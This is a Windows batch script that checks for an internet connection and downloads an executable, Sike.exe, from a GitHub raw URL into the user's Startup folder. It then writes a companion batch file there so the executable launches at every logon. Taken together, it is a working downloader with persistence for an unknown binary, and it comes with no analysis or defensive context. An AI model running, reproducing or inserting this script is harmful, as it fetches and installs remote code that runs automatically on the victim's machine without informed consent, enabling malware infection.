@echo off
setlocal

:: Define the URL and target file
set "url=https://github.com/KhingEmmy/_airmmy/raw/main/Sike.exe"
set "startupDir=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "targetFile=%startupDir%\Sike.exe"

:: Function to check internet connection
:checkinternet
ping -n 1 google.com >nul 2>&1
if errorlevel 1 (
    echo No internet connection. Retrying in 10 seconds...
    timeout /t 10
    goto checkinternet
)

:: Download the file
:download
echo Internet connection detected. Downloading file...
curl -L -o "%targetFile%" "%url%"

:: Ensure the file runs on startup
:run
echo Ensuring %targetFile% runs on startup...
echo start "" "%targetFile%" > "%startupDir%\runSike.bat"

echo Setup complete. The executable will run on startup.
exit
